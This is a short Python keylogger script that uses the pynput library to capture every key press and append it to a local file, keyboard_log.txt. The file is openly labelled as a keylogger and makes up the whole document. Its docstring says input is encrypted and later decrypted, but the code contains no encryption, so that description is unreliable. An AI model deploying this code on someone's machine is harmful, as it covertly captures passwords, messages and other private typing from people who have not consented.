"""
Keylogging program that encrypts user input and then decrypted once
received by the OS
"""

from pynput import keyboard

file_path = "./keyboard_log.txt"


def trackKey(letter):
    with open(file_path, "a") as file:
        try:
            file.write(letter.char)
            file.write("\n")
        except:
            file.write("Error getting letter\n")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=trackKey)
    listener.start()
    input()